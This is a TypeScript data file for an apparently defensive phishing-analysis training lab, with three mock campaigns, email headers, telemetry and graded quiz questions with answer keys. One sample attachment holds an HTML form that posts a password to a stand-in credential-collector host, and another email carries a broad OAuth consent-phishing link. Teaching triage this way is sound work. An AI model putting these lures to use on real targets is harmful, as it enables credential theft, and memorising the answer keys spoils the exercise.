export interface HeaderCheck {
  spf: 'PASS' | 'FAIL' | 'SOFTFAIL' | 'NONE';
  dkim: 'PASS' | 'FAIL' | 'NONE';
  dmarc: 'PASS' | 'FAIL' | 'NONE';
  returnPath: string;
  senderIp: string;
}

export interface EmailArtifact {
  id: string;
  sender: string;
  senderDisplay: string;
  recipient: string;
  subject: string;
  date: string;
  body: string;
  rawHeaders: string;
  authSummary: HeaderCheck;
  attachmentName?: string;
  attachmentSnippet?: string;
}

export interface Question {
  id: string;
  prompt: string;
  type: 'multiple-choice' | 'text';
  options?: string[];
  correctAnswer: string;
  points: number;
  explanation: string;
  category: 'Headers & Auth' | 'Domain Analysis' | 'Payload & Lure' | 'Remediation';
}

export interface LabScenario {
  id: string;
  title: string;
  timeLimitSeconds: number;
  briefing: string;
  emails: EmailArtifact[];
  telemetry: {
    whois: Record<string, string>;
    dnsRecords: Record<string, string[]>;
    proxyLogs?: string[];
  };
  questions: Question[];
}

export const CAMPAIGNS: Record<string, LabScenario> = {
  // Scenario 1: Refined Classic Spoofing & Credential Harvesting
  nightwire: {
    id: 'nightwire',
    title: 'Operation Nightwire',
    timeLimitSeconds: 1800, // 30 minutes
    briefing:
      'A targeted phishing barrage hit Contoso Finance. Analyze the mock inbox, raw RFC 5322 headers, and the Discover-Phish telemetry to triage the spoofing and payload mechanisms.',
    emails: [
      {
        id: 'msg-01',
        sender: 'security@micros0ft-support-alert.com',
        senderDisplay: 'Microsoft IT Helpdesk',
        recipient: 'alex.vance@contoso.local',
        subject: 'URGENT: Password Expiry Notification - Action Required',
        date: '2026-09-07 08:14:02 UTC',
        rawHeaders: `Received: from mail.micros0ft-support-alert.com (198.51.100.24) by mail.contoso.local (10.0.0.5); Mon, 7 Sep 2026 08:14:02 +0000
Authentication-Results: contoso.local;
  spf=fail (sender IP is 198.51.100.24) smtp.mailfrom=bounce@micros0ft-support-alert.com;
  dkim=none (no signature found);
  dmarc=fail (p=reject sp=reject) header.from=microsoft.com
From: "Microsoft IT Helpdesk" <admin@microsoft.com>
To: alex.vance@contoso.local
Return-Path: <bounce@micros0ft-support-alert.com>
Subject: URGENT: Password Expiry Notification - Action Required
Content-Type: text/html; charset="UTF-8"`,
        authSummary: {
          spf: 'FAIL',
          dkim: 'NONE',
          dmarc: 'FAIL',
          returnPath: 'bounce@micros0ft-support-alert.com',
          senderIp: '198.51.100.24'
        },
        body: `Your corporate Microsoft 365 password expires in 2 hours.<br/><br/>
Please keep your current password by verifying identity here: 
<a href="https://login.micros0ft-portal-auth.net/verify">Verify Corporate Identity</a>.`,
        attachmentName: 'Identity_Notice.html',
        attachmentSnippet: `<!-- Static Attachment Inspector -->
<form action="http://collector.external-gate.cc/harvest" method="POST">
  <input type="hidden" name="ref" value="contoso_alex" />
  <input type="password" name="pwd_field" />
</form>`
      },
      {
        id: 'msg-02',
        sender: 'billing@apex-logistics-corp.com',
        senderDisplay: 'Apex Logistics Billing',
        recipient: 'accounts-payable@contoso.local',
        subject: 'Updated Routing Instructions - Q3 Invoice #8841',
        date: '2026-09-07 09:22:15 UTC',
        rawHeaders: `Received: from mail-relay.apex-logistics-corp.com (203.0.113.88) by mail.contoso.local (10.0.0.5); Mon, 7 Sep 2026 09:22:15 +0000
Authentication-Results: contoso.local;
  spf=pass (sender IP is 203.0.113.88) smtp.mailfrom=billing@apex-logistics-corp.com;
  dkim=pass header.d=apex-logistics-corp.com;
  dmarc=pass (p=quarantine) header.from=apex-logistics-corp.com
From: "Apex Logistics Billing" <billing@apex-logistics-corp.com>
To: accounts-payable@contoso.local
Return-Path: <billing@apex-logistics-corp.com>
Subject: Updated Routing Instructions - Q3 Invoice #8841
Content-Type: text/plain; charset="UTF-8"`,
        authSummary: {
          spf: 'PASS',
          dkim: 'PASS',
          dmarc: 'PASS',
          returnPath: 'billing@apex-logistics-corp.com',
          senderIp: '203.0.113.88'
        },
        body: `Please find updated remittance details for invoice #8841. Our previous banking partner is undergoing an audit. Direct all wire payments to Routing #021000021, Account #991029312 immediately.`
      }
    ],
    telemetry: {
      whois: {
        'micros0ft-portal-auth.net': 'Created: 2 days ago | Registrar: NameSilo | Registrant Privacy: Enabled',
        'apex-logistics-corp.com': 'Created: 8 years ago | Registrar: GoDaddy | Org: Apex Logistics LLC'
      },
      dnsRecords: {
        'micros0ft-portal-auth.net': ['A 198.51.100.52', 'MX mail.micros0ft-support-alert.com'],
        'apex-logistics-corp.com': ['v=spf1 ip4:203.0.113.88 -all']
      }
    },
    questions: [
      {
        id: 'nw-q1',
        prompt: 'Why did the Microsoft Helpdesk email fail DMARC alignment?',
        type: 'multiple-choice',
        options: [
          'The DKIM signature expired.',
          'The RFC 5322 From domain (microsoft.com) does not match the Return-Path / SPF domain.',
          'The mail server was missing an SSL certificate.',
          'The destination IP was blocked by Contoso firewall.'
        ],
        correctAnswer: 'The RFC 5322 From domain (microsoft.com) does not match the Return-Path / SPF domain.',
        points: 10,
        explanation: 'DMARC alignment requires the From header domain to align with the authenticated SPF or DKIM domain.',
        category: 'Headers & Auth'
      },
      {
        id: 'nw-q2',
        prompt: 'What IP address originated the connection for the spoofed Microsoft email?',
        type: 'text',
        correctAnswer: '198.51.100.24',
        points: 10,
        explanation: 'The initial Received hop from the external server lists 198.51.100.24.',
        category: 'Headers & Auth'
      },
      {
        id: 'nw-q3',
        prompt: 'Examine message msg-02 (Apex Logistics). It passes SPF, DKIM, and DMARC. What type of attack is this?',
        type: 'multiple-choice',
        options: [
          'Direct Domain Spoofing',
          'Business Email Compromise (BEC) via compromised vendor account',
          'Homograph IDN attack',
          'DNS Cache Poisoning'
        ],
        correctAnswer: 'Business Email Compromise (BEC) via compromised vendor account',
        points: 15,
        explanation: 'Because all email security records pass and originate from the real infrastructure, the mailbox or sender account itself was likely compromised.',
        category: 'Payload & Lure'
      },
      {
        id: 'nw-q4',
        prompt: 'In msg-01 attachment source, what is the absolute domain where credentials are being posted?',
        type: 'text',
        correctAnswer: 'collector.external-gate.cc',
        points: 15,
        explanation: 'The HTML form target points to http://collector.external-gate.cc/harvest.',
        category: 'Payload & Lure'
      }
    ]
  },

  // Scenario 2: Modern Illicit OAuth Consent Grant Attack
  shadowgrant: {
    id: 'shadowgrant',
    title: 'Operation ShadowGrant',
    timeLimitSeconds: 1200, // 20 minutes
    briefing:
      'Employees are receiving notifications requesting authorization for a new "Executive Expense Tool". Investigate the permissions requested and determine the risk of Illicit Consent Grant.',
    emails: [
      {
        id: 'sg-01',
        sender: 'notifications@app-expense-portal.io',
        senderDisplay: 'Contoso Tools Platform',
        recipient: 'claire.redfield@contoso.local',
        subject: 'Authorization Required: Enable 2026 Q3 Expense Automations',
        date: '2026-09-07 11:05:00 UTC',
        rawHeaders: `Received: from mail.app-expense-portal.io (192.0.2.190) by mail.contoso.local; Mon, 7 Sep 2026 11:05:00 +0000
Authentication-Results: contoso.local; spf=pass; dkim=pass header.d=app-expense-portal.io; dmarc=pass
From: "Contoso Tools Platform" <notifications@app-expense-portal.io>
To: claire.redfield@contoso.local
Subject: Authorization Required: Enable 2026 Q3 Expense Automations`,
        authSummary: {
          spf: 'PASS',
          dkim: 'PASS',
          dmarc: 'PASS',
          returnPath: 'bounce@app-expense-portal.io',
          senderIp: '192.0.2.190'
        },
        body: `Please authorize the updated Contoso Enterprise Accounting Add-in on your Microsoft 365 Tenant.<br/><br/>
<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=7b01d3bb-88fe-4e09-b903-87a41920800b&response_type=code&scope=User.Read%20Mail.ReadWrite%20Files.ReadWrite.All%20offline_access">Review Application Permissions</a>`,
        attachmentName: 'manifest.json',
        attachmentSnippet: `{
  "app_name": "AccountingSyncPro",
  "client_id": "7b01d3bb-88fe-4e09-b903-87a41920800b",
  "publisher_domain": "unverified-tenants.cc"
}`
      }
    ],
    telemetry: {
      whois: {
        'unverified-tenants.cc': 'Created: 4 days ago | Privacy: Redacted'
      },
      dnsRecords: {
        'unverified-tenants.cc': ['A 203.0.113.11']
      }
    },
    questions: [
      {
        id: 'sg-q1',
        prompt: 'Which high-impact permission requested in the OAuth link grants access to modify all cloud files without user presence?',
        type: 'multiple-choice',
        options: ['User.Read', 'Files.ReadWrite.All', 'openid', 'Contacts.Read'],
        correctAnswer: 'Files.ReadWrite.All',
        points: 15,
        explanation: 'Files.ReadWrite.All grants full read and write permissions to all files the signed-in user has access to.',
        category: 'Payload & Lure'
      },
      {
        id: 'sg-q2',
        prompt: 'What OAuth scope allows the application to retain persistent API access after the user signs out?',
        type: 'text',
        correctAnswer: 'offline_access',
        points: 15,
        explanation: 'The offline_access scope requests a refresh token, allowing long-term API access.',
        category: 'Payload & Lure'
      },
      {
        id: 'sg-q3',
        prompt: 'What tenant mitigation stops end-users from granting consents to unverified multi-tenant applications?',
        type: 'multiple-choice',
        options: [
          'Enable SPF hard fail (-all)',
          'Require Admin Consent Workflow in Entra ID / Azure AD',
          'Deploy local antivirus signatures',
          'Block port 587 on outbound firewalls'
        ],
        correctAnswer: 'Require Admin Consent Workflow in Entra ID / Azure AD',
        points: 20,
        explanation: 'Enabling the Admin Consent workflow blocks users from consenting to apps requiring sensitive permissions.',
        category: 'Remediation'
      }
    ]
  },

  // Scenario 3: AiTM (Adversary-in-the-Middle) Proxy + Quishing (QR)
  glassphantom: {
    id: 'glassphantom',
    title: 'Operation GlassPhantom',
    timeLimitSeconds: 1500, // 25 minutes
    briefing:
      'Attackers deployed an Evilginx reverse proxy setup and distributed the lure via a PDF containing a QR code to bypass text-based gateway scanners.',
    emails: [
      {
        id: 'gp-01',
        sender: 'hr-portal@executive-benefits-secure.net',
        senderDisplay: 'HR Shared Services',
        recipient: 'staff-all@contoso.local',
        subject: 'Action Required: Scan your Benefits Enrollment QR',
        date: '2026-09-07 14:00:00 UTC',
        rawHeaders: `From: "HR Shared Services" <hr-portal@executive-benefits-secure.net>
To: staff-all@contoso.local
Subject: Action Required: Scan your Benefits Enrollment QR
Content-Type: multipart/mixed; boundary="====BOUNDARY===="`,
        authSummary: {
          spf: 'PASS',
          dkim: 'PASS',
          dmarc: 'PASS',
          returnPath: 'bounces@executive-benefits-secure.net',
          senderIp: '198.51.100.99'
        },
        body: `Please scan the QR code attached in your 2026 Benefits Packet to confirm your enrollment on your mobile authenticator.`,
        attachmentName: 'BenefitsQR.pdf',
        attachmentSnippet: `<!-- Decoded QR Matrix Payload -->
URL: https://login.microsoftonline.contoso-sso.executive-benefits-secure.net/common/login`
      }
    ],
    telemetry: {
      whois: {
        'executive-benefits-secure.net': 'Created: 1 day ago | Registrar: Porkbun'
      },
      dnsRecords: {
        'login.microsoftonline.contoso-sso.executive-benefits-secure.net': ['A 198.51.100.99']
      },
      proxyLogs: [
        'POST /common/login HTTP/1.1 -> Forwarded to login.microsoftonline.com [200 OK]',
        'Captured Header: Set-Cookie: ESTSAUTH=0.AXAAd1...; domain=.login.microsoftonline.com; Secure; HttpOnly',
        'Captured Header: Set-Cookie: ESTSAUTHPERSISTENT=...; Secure; HttpOnly'
      ]
    },
    questions: [
      {
        id: 'gp-q1',
        prompt: 'Why do attackers use QR codes (Quishing) inside attached PDF documents?',
        type: 'multiple-choice',
        options: [
          'QR codes encrypt the connection end-to-end.',
          'To evade text/URL pattern analysis by Secure Email Gateways (SEGs).',
          'To disable Multi-Factor Authentication automatically.',
          'To crash the client email application memory.'
        ],
        correctAnswer: 'To evade text/URL pattern analysis by Secure Email Gateways (SEGs).',
        points: 15,
        explanation: 'SEGs often parse plain text and links, whereas images/PDFs require OCR or computer vision to detect embedded URLs.',
        category: 'Payload & Lure'
      },
      {
        id: 'gp-q2',
        prompt: 'According to the captured reverse-proxy telemetry, what critical Microsoft 365 session cookie was hijacked?',
        type: 'text',
        correctAnswer: 'ESTSAUTH',
        points: 20,
        explanation: 'The ESTSAUTH cookie represents the authenticated session token passed through the AiTM proxy.',
        category: 'Payload & Lure'
      },
      {
        id: 'gp-q3',
        prompt: 'What primary defense effectively mitigates Adversary-in-the-Middle (AiTM) reverse proxy session theft?',
        type: 'multiple-choice',
        options: [
          'SMS-based one-time passcodes',
          'FIDO2 / WebAuthn phishing-resistant MFA (Hardware Keys or Passkeys)',
          'Complex password rotation rules',
          'Updating MX records'
        ],
        correctAnswer: 'FIDO2 / WebAuthn phishing-resistant MFA (Hardware Keys or Passkeys)',
        points: 20,
        explanation: 'FIDO2 / WebAuthn binds cryptographic authentication credentials directly to the genuine browser URL origin, breaking reverse-proxy replay.',
        category: 'Remediation'
      }
    ]
  }
};

// Default export active scenario
export const ACTIVE_CAMPAIGN: LabScenario = CAMPAIGNS.nightwire;
